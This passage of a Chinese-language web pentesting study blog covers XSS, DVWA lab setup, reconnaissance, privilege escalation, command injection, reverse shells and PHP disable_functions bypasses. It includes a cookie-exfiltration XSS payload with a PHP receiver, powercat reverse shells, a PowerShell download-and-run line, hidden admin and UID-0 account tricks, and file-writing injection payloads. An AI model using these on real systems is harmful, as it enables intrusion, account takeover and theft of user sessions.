<p>通过留言板等功能，将攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。</p>
<p><strong>存储型xss漏洞poc：</strong></p>
<p>同反射型xss</p>
<h1 id="六、DOM型XSS"><a href="#六、DOM型XSS" class="headerlink" title="六、DOM型XSS"></a>六、DOM型XSS</h1><p><strong>DOM的意思：</strong></p>
<p>DOM文档对象模型(DocumentObjeetModel,DOM)是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式</p>
<p><strong>漏洞概念</strong>：</p>
<p>不经过后端，DOM-XSS漏洞是基于文档对象模型的一种漏洞，简单去理解就是因为输出点在DOM。DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
<p><strong>攻击手法：</strong></p>
<p>攻击者构造出特殊的URL，其中包含恶意代码。用户打开带有恶意代码的URL用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</p>
<p><strong>常用DOM方法</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">getElementById()</td>
<td align="left">返回带有指定ID的元素</td>
</tr>
<tr>
<td align="left">getElementsByTagName()</td>
<td align="left">返回带有指定标签的所有元素的节点列表</td>
</tr>
<tr>
<td align="left">getElementsByClassName()</td>
<td align="left">返回包含带有指定类名的所有元素的节点列表</td>
</tr>
<tr>
<td align="left">appendchild()</td>
<td align="left">把新节点添加到指定节点</td>
</tr>
<tr>
<td align="left">removeChild()</td>
<td align="left">删除子节点</td>
</tr>
<tr>
<td align="left">replaceChild()</td>
<td align="left">替换子节点</td>
</tr>
<tr>
<td align="left">insertBefore()</td>
<td align="left">在指定的子节点前面插入新的子节点</td>
</tr>
<tr>
<td align="left">createAttribute()</td>
<td align="left">创建属性节点</td>
</tr>
<tr>
<td align="left">createElement()</td>
<td align="left">创建元素节点</td>
</tr>
</tbody></table>
<p><strong>DOM型XSS漏洞poc</strong></p>
<pre class="highlight"><span class="line">?message=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre>

<p><strong>三种漏洞的区别</strong></p>
<p>存储型XSS与反射型XSS的区别</p>
<p>存储型XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里</p>
<p><strong>DOM型与其他两种XSS的区别</strong></p>
<p>DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种XSS都属于服务端的安全漏洞</p>
<h1 id="七、XSS漏洞测试过程"><a href="#七、XSS漏洞测试过程" class="headerlink" title="七、XSS漏洞测试过程"></a>七、XSS漏洞测试过程</h1><p>1、判断是否是html实体编码(查看源代码)</p>
<p>单双引号尖括号等，是否转义</p>
<p><code>&#39;&quot;&lt;&gt;()</code></p>
<p>2、确定输出位置</p>
<p>3、判断闭合符</p>
<p>标签外，直接使用</p>
<p>标签内，需要闭合标签</p>
<p>4、绕过waf</p>
<table>
<thead>
<tr>
<th align="left">标签</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">a标签</td>
<td align="left">存在onclick、onmousemove等事件，无onerror事件</td>
</tr>
<tr>
<td align="left">img标签</td>
<td align="left">存在onerror、onclick、onmousemove等事件</td>
</tr>
<tr>
<td align="left">input标签</td>
<td align="left">存在onchange、onmousemove等事件，无onload、onerror事件</td>
</tr>
<tr>
<td align="left">svg标签</td>
<td align="left">存在onload、onclick、onmousemove等事件</td>
</tr>
</tbody></table>
<p>注：onload、onerror会在页面加载完成之后立刻触发，其他都要手动触发。优先选择自动触发事件。</p>
<h1 id="八、XSS简单利用"><a href="#八、XSS简单利用" class="headerlink" title="八、XSS简单利用"></a>八、XSS简单利用</h1><p>1、XSS获取管理员权限(获取cookie)——重要</p>
<p>2、XSS键盘记录——重要</p>
<p>3、XSS获取内网IP</p>
<p>XSS获取cookie</p>
<pre class="highlight"><span class="line">alert(document.cookie)</span><br></pre>

<p><strong>自动发送请求的标签</strong></p>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&quot;&gt;</code></td>
<td align="left">链接标签</td>
</tr>
<tr>
<td align="left"><code>&lt;img src=&quot;&quot;&gt;</code></td>
<td align="left">图片标签</td>
</tr>
<tr>
<td align="left"><code>&lt;script src=&quot;&quot;&gt;&lt;/script&gt;</code></td>
<td align="left">script标签</td>
</tr>
<tr>
<td align="left"><code>&lt;iframe src=&quot;&quot;&gt;&lt;/iframe&gt;</code></td>
<td align="left">内联框架标签</td>
</tr>
<tr>
<td align="left"><code>&lt;video src=&quot;&quot;&gt;&lt;/video&gt;</code></td>
<td align="left">视频标签</td>
</tr>
<tr>
<td align="left"><code>&lt;audio src=&quot;&quot;&gt;&lt;/audio&gt;</code></td>
<td align="left">音频标签</td>
</tr>
</tbody></table>
<p>通过自发送标签，将cookie值base64编码后，发送到自己的服务器，即可获取目标cookie信息</p>
<p>使用<code>&lt;script src=http:\\xxx&gt;&lt;/script&gt;</code>加载压缩后的短网址，访问js文件</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">发送js</td>
<td align="left"><code>s=document.createElement(&#39;script&#39;);s.src=&#39;http://192.168.21.66:9999/cookie.php?cookie=&#39; + btoa(document.cookie);document.body.appendChild(s);</code></td>
</tr>
<tr>
<td align="left">接收php</td>
<td align="left">`&lt;?php if ($_GET[‘cookie’]) { file_put_contents(‘cookie.txt’, “IP:” . $_SERVER[‘REMOTE_ADDR’] . “\nCookie: “ . base64_decode($_GET[‘cookie’]) . “\n\n”, FILE_APPEND</td>
</tr>
</tbody></table>
<p><strong>XSS获取键盘记录</strong></p>
<pre class="highlight"><span class="line">window.onkeypress=function(key)&#123;</span><br><span class="line"></span><br><span class="line">console.log(key);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>

<p>公开的XSS平台</p>
<p><a href="https://xss.pt/">https://xss.pt</a></p>
<p><a href="https://xsshs.cn/">https://xsshs.cn</a></p>
<p>当<code>&lt;script&gt;</code>标签无法使用时，可用其他标签使用dom操作，生成</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7搭建DVWA</title>
    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>

<p>启动apache并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>

<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>

<p>启动Mysql并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>

<p>配置Mysql数据库</p>
<p>初始化mysql数据库（全部回车确认）</p>
<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>

<p>设置mysql密码（非操作系统密码）</p>
<p>配置</p>
<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>

<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>

<p>重启apache使php生效（php不是独立软件，依附apache）</p>
<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>

<p>配置</p>
<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>

<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>

<p>解压并复制到/var/www/html目录</p>
<p>配置</p>
<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>

<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>

<p>创建数据库</p>
<p>登录（admin:password）</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th align="left">步骤</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">前期交互</td>
<td align="left">渗透人员+甲方客户-&gt;签授权合同  <br>规定攻击方式 ： <br>&#9;apt、钓鱼、近源、web、ddos、禁止延时盲注等  <br>规定渗透范围 ： <br>&#9;公司范围、目标范围  <br>规定渗透时间 ： <br>&#9;攻防演练：7天 长期渗透：2-3年  <br>规定法律法规相关 <br>规定信息泄露相关</td>
</tr>
<tr>
<td align="left">信息搜集</td>
<td align="left">大型企业 ：股权信息搜集 <br>中型企业 ：域名 <br>小型企业 ：IP  信息<br><br>收集方式 <br>主动收集：<br>与目标交互，会记录自己的操作信息 <br>被动收集：<br>不与目标交互，搜索引擎等工具  <br><br><strong>谷歌语法</strong> <br>site:找到与指定网站有联系的URL <br>inurl：将返回url中含有关键词的网页 <br>allinurl：与inurl类似，可以指定多个词 <br>intext：寻找正文中含有关键字的网页 <br>allintext：寻找正文中的多个关键字 <br>intitle：寻找标题中含有关键字的网页 <br>allintitle：寻找标题中的多个关键字 <br>filetype：指定访问的文件类型  <br><br>符号使用 <br>1、精确搜索： <br>给关键词加上双引号实现精确匹配双引号内的字符 <br><br>2、通配符： <br>谷歌的通配符是星号<code>&quot;*&quot;</code>，必须在精确搜索符双引号内部使用。用通配符代替关键词或短语中无法确定的字词 <br><br>3、点号匹配任意字符： <br>点号<code>&quot;.&quot;</code>匹配的是匹配某个字符，不是字、短语等内容。 <br><br>4、基本搜索符号约束： <br>加号<code>&quot;+&quot;</code>用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加<code>&quot;-&quot;</code>减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选。 <br><br>5、数字范围：<br>用两个点号<code>&quot;..&quot;</code>表示一个数字范围。一般应用于日期、货币、尺寸、重量、高度等范围的搜索如：手机2000..3000元，注意“3000”与“元”之间必须有空格<br><br>6、布尔逻辑：<br>或，符号`”</td>
</tr>
<tr>
<td align="left">威胁建模</td>
<td align="left">建立excle表格，进行信息整理，初步猜测可能存在的漏洞点 域名、IP、端口、中间件等</td>
</tr>
<tr>
<td align="left">渗透测试</td>
<td align="left">top10漏洞、cms漏洞等 <br>注意： <br>挖src时，只允许到此截断，且webshell只允许输出提示语句（echo ‘ok’等）； <br>xss只允许使用console.log(/xss/)等 …</td>
</tr>
<tr>
<td align="left">后渗透测试</td>
<td align="left">有指向性的获取目标数据（狭义上：内网渗透）</td>
</tr>
<tr>
<td align="left">报告截断</td>
<td align="left">撰写报告</td>
</tr>
</tbody></table>
<p>其他：</p>
<p>注册网站信息查询</p>
<p><a href="https://www.reg007.com/">https://www.reg007.com/</a></p>
<p>网站监测</p>
<p><a href="https://anquan.baidu.com/product/secindex?industry=total">https://anquan.baidu.com/product/secindex?industry=total</a></p>
<p>DNS信息</p>
<p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
<p>whoami信息</p>
<p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
<p>网站指纹信息</p>
<p><a href="https://www.godeye.vip/">https://www.godeye.vip/</a></p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>创建用户+提权</title>
    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>

<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>

<p>b、然后修改用户，使其属于root组</p>
<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>

<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>

<p>b、使用test账号登录，即可使用sudo权限操作</p>
<p>如：sudo ls</p>
<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>

<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>

<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>



<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>

<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>

<p>查看管理员组成员</p>
<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>

<p>删除用户</p>
<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>

<p>禁用用户/启用用户</p>
<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/article/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="一、漏洞的原因及本质"><a href="#一、漏洞的原因及本质" class="headerlink" title="一、漏洞的原因及本质"></a>一、漏洞的原因及本质</h1><p>代码层过滤不严，应用程序直接或间接使用了动态执行命令的危险函数，并且这个函数的运行参数是可控的。当服务器没有严格过滤用户提供的参数时，就有可能导致用户提交恶意代码被服务器执行，从而造成命令执行漏洞。</p>
<p><strong>涉及到的函数</strong></p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">system</td>
<td align="left">能够将字符串作为OS命令执行，自带输出功能</td>
</tr>
<tr>
<td align="left">exec()</td>
<td align="left">能将字符串作为OS命令执行，但无输出，需要输出执行结果 注意：只输出最后一行数据</td>
</tr>
<tr>
<td align="left">shell_exec()</td>
<td align="left">执行命令并以字符串的形式，返回完整的信息，但是函数无回显，需要输出执行结果</td>
</tr>
<tr>
<td align="left">passthru()</td>
<td align="left">执行外部命令，与exec()类似，但是该函数会直接将结果输出，无需输出执行</td>
</tr>
<tr>
<td align="left">popen()</td>
<td align="left">打开并运行一个程序文件，返回一个文件指针</td>
</tr>
<tr>
<td align="left">反引号<code>(``)、[``]</code>内的字符串，也会被解析成OS命令</td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="二、命令执行漏洞的危害"><a href="#二、命令执行漏洞的危害" class="headerlink" title="二、命令执行漏洞的危害"></a>二、命令执行漏洞的危害</h1><p>1、继承Web服务器程序权限（Web用户权限），去执行系统命令</p>
<p>2、继承Web服务器权限，读写文件</p>
<p>3、反弹Shell</p>
<p>4、控制整个网站</p>
<p>5、控制整个服务器</p>
<p><strong>利用</strong></p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查看系统文件</td>
<td align="left">payload：[?cmd=type c:\windows\system32\drivers\etc\hosts] 查看系统hosts文件</td>
</tr>
<tr>
<td align="left">显示当前路径</td>
<td align="left">payload：[?cmd=cd]</td>
</tr>
<tr>
<td align="left">显示当前权限</td>
<td align="left">payload：[?cmd=whoami]</td>
</tr>
<tr>
<td align="left">写文件</td>
<td align="left">payload：[?cmd=echo”x” &gt; C:\phpStudy\WWW\Commmand\shell.php] 页面没有报错，说明文件写入成功</td>
</tr>
</tbody></table>
<h1 id="三、命令执行语法"><a href="#三、命令执行语法" class="headerlink" title="三、命令执行语法"></a>三、命令执行语法</h1><p>Windows</p>
<table>
<thead>
<tr>
<th align="left">命令格式</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">command1 &amp; command2</td>
<td align="left">挂起，同时执行Command1和command2，无论command1执行是否成功都执行cmmand2</td>
</tr>
<tr>
<td align="left">command1 &amp;&amp; command2</td>
<td align="left">且，先后执行Command1和command2，只有command1执行成功时才执行command2</td>
</tr>
<tr>
<td align="left">command1 || command2</td>
<td align="left">或，先后执行Command1和command2，只有command1执行失败时才执行command2</td>
</tr>
<tr>
<td align="left">command1 | command2</td>
<td align="left">管道符，将command1的执行结果传递给command2</td>
</tr>
</tbody></table>
<p>Linux</p>
<table>
<thead>
<tr>
<th align="left">命令格式</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">command1 ; command2</td>
<td align="left">分隔，先后执行Command1和command2，各自无影响</td>
</tr>
<tr>
<td align="left">command1 &amp; command2</td>
<td align="left">挂起，同时执行Command1和command2，无论command1执行是否成功都执行cmmand2</td>
</tr>
<tr>
<td align="left">command1 &amp;&amp; command2</td>
<td align="left">且，先后执行Command1和command2，只有command1执行成功时才执行command2</td>
</tr>
<tr>
<td align="left">command1 || command2</td>
<td align="left">或，先后执行Command1和command2，只有command1执行失败时才执行command2</td>
</tr>
<tr>
<td align="left">command1 | command2</td>
<td align="left">管道符，将command1的执行结果传递给command2</td>
</tr>
<tr>
<td align="left">command1.<code>command2</code></td>
<td align="left">反引号<code>&quot; `` &quot;</code>，优先执行,无论command1是否执行成功</td>
</tr>
</tbody></table>
<h1 id="四、命令执行漏洞的防御"><a href="#四、命令执行漏洞的防御" class="headerlink" title="四、命令执行漏洞的防御"></a>四、命令执行漏洞的防御</h1><p>1、尽量少使用执行命令函数或者禁用disable_functions</p>
<p>2、在进入执行命令的函数之前，对参数进行过滤，对敏感字符进行转义</p>
<p>3、参数值尽量使用引号包括，并在拼接前调用addslashes进行转义</p>
<p>注：windows写入用单引号，linux用双引号。</p>
<h1 id="五、反弹shell"><a href="#五、反弹shell" class="headerlink" title="五、反弹shell"></a>五、反弹shell</h1><p>正向shell不可控，但是不受网络环境影响（自己内网连接目标公网）</p>
<p>控制端-&gt;被控端，被控端需要开启监听（被控端防火墙、端口开启等难度大，不建议）</p>
<pre class="highlight"><span class="line">powercat -l -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888</span><br></pre>

<p>反弹shel可控，但是需要网络可达（目标内网连接自己公网）</p>
<p>被控端-&gt;控制端，控制端开启监听可控，被控端只需要连接即可，容易实现</p>
<p>注：无论是哪种shell，都是控制端控制被控端。</p>
<pre class="highlight"><span class="line">powercat -c x.x.x.x -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">nc -lnvp 8888</span><br></pre>

<p>powershell程序反弹shell</p>
<p>(程序为powershell函数，让目标服务器可以执行powershell命令)</p>
<p>从本地上传脚本</p>
<pre class="highlight"><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\powercat.ps1;powercat -c x.x.x.x -p 8888 -e cmd&quot;</span><br></pre>

<p>从公网服务器下载脚本</p>
<pre class="highlight"><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.21.66:8000/windows/powercat.ps1&#x27;);powercat -c 192.168.21.66 -p 8888 -e cmd</span><br></pre>

<p>详见反弹shell归纳笔记。</p>
<h1 id="六、绕过disable-functions"><a href="#六、绕过disable-functions" class="headerlink" title="六、绕过disable functions"></a>六、绕过disable functions</h1><p>disable_functions是在/etc/php/apache2/php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数</p>
<p>通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等</p>
<p>phpinfo中为disable functions，默认为空，可以通过修改配置文件php.ini进行设置</p>
<p>如果disable functions被启用，即使拿到webshell，命令执行依然受到限制</p>
<p>绕过方法</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">常规绕过： <br>exec,shell_exec,system,passthru,popen,proc_open</td>
<td align="left">黑名单不全绕过 （蚁剑自带黑名单绕过）</td>
</tr>
<tr>
<td align="left">利用环境变量LD_PRELOAD绕过 <br>LD_PRELOAD是Linux系统的下的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库。 通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的</td>
<td align="left">前提条件 <br>1、能够上传自己的.so文件 <br>2、能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数 <br>3、存在mail()、imap_mail()、mb_send_mail()和error_log()等可以控制PHP启动外部程序并能执行的函数  <br><br>利用过程 <br>1、首先，能够上传恶意.so文件，.so文件由攻击者在本地使用与服务端相近的系统环境进行编译，该库中重写了相关系统函数，重写的系统函数能够被PHP中未被disable_functions禁止的函数所调用 <br>2、能够设置环境变量，比如putenv函数未被禁止，就可以把LD_PRELOAD变量设置为恶意.so文件的路径，只要启动新的进程就会在新进程运行前优先加载该恶意.so文件，导致恶意代码就被注入到程序中 <br>3、当执行未被禁止的PHP函数，并且该函数调用了恶意库中重写的系统函数，就可以达到任意执行系统命令的效果了，因为重写的系统函数中的内容是我们可控的，对这部分内容进行编程即可</td>
</tr>
<tr>
<td align="left">利用pcntl_exec绕过</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">利用imap_open函数任意命令执行(CVE-2018-19518)</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">利用系统组件window com绕过 <br>COM组件它最早的设计意图是，跨语言实现程序组件的复用 COM组件由以Win32动态连接库（DLL）或可执行文件（EXE）形式发布的可执行代码所组成，遵循COM规范编写出来的组件将能够满足对组件架构的所有要求</td>
<td align="left">前提条件 <br>1、php版本为5.4，高版本扩展要自己添加 <br>2、要在php.ini中开启extension=php_com_dotnet.dll 函数： <br>exec(“cmd /c”.$command); <br>$stdout = $exec-&gt;StdOut(); <br>$stringput = $stdout-&gt;ReadALL(); <br>print($stringput); ?&gt; <br><br>使用： <br>com.php?shell=whoami</td>
</tr>
<tr>
<td align="left">利用Apache+mod_cgi+.htaccess绕过 ModCGI把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP，它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行。 .htaccess文件中可以定制用户定义标识头，如果添加Options+ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本，添加AddHandlercgi-script.cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序</td>
<td align="left">前提条件 <br>1、启用mod-cgi <br>2、.htaccess可写 <br>3、保证.htaccess可以加载进当前web环境。当apache配置文件中指定web目录下AllowOverride参数值为None时，.htaccess文件无法生效</td>
</tr>
<tr>
<td align="left">利用ImageMagick漏洞绕过</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">利用PHP7.4的FFI绕过利用ShellShock绕过(CVE-2014-6271)</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">利用蚁剑插件绕过</td>
<td align="left">加载插件-&gt;辅助管理-&gt;绕过disable_functions</td>
</tr>
</tbody></table>
<h1 id="七、反序列化漏洞"><a href="#七、反序列化漏洞" class="headerlink" title="七、反序列化漏洞"></a>七、反序列化漏洞</h1><p>将对象的状态信息转换为可以存储或传输的形式（字符串）的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。简单的说，序列化就是把一个对象变成可以传输的字符串，可以以特定的格式在进程之间跨平台、安全的进行通信。</p>
<p><strong>序列化的用途</strong></p>
<p>方便对象在网络中的传输与存储</p>
<p><strong>序列化与反序列化的过程：</strong></p>
<p>序列化：将对象转换为流，利于储存和传输的格式</p>
<p>反序列化：将流转换为对象</p>
<p><strong>PHP反序列化</strong></p>
<p>PHP对象类型数据，反序列化之前，需要对反序列化对象提前定义。</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">serialize($a)</td>
<td align="left">序列化</td>
</tr>
<tr>
<td align="left">unserialize($a)</td>
<td align="left">反序列化</td>
</tr>
</tbody></table>
<p><strong>形成原因：</strong></p>
<p>程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p>
<p><strong>常见的魔法函数介绍</strong></p>
<p>序列化本身并不存在任何漏洞，但是搭配上PHP的魔法函数，整个程序的执行流程就将变得可控</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">__construct()</td>
<td align="left">当一个对象创建时被调用（相当于c++的构造函数）</td>
</tr>
<tr>
<td align="left">__destruct()</td>
<td align="left">当一个对象销毁时被调用（相当于c++的析构函数）</td>
</tr>
<tr>
<td align="left">__sleep()</td>
<td align="left">在对象被序列化之前被调用</td>
</tr>
<tr>
<td align="left">__weakup()</td>
<td align="left">将在unserialize()函数执行反序列化时调用。</td>
</tr>
<tr>
<td align="left">__toString()</td>
<td align="left">当一个对象被当作一个字符串时使用</td>
</tr>
</tbody></table>
<p><strong>注意：</strong></p>
<p>PHP的反序列化漏洞需要与其他漏洞配合，比如代码执行、代码执行等。</p>
<p><strong>防御：</strong></p>
<p>1、要严格过滤用户输入的unserialize函数的参数</p>
<p>2、要对unserialize后的变量内容进行检查，以确定内容没有被污染</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
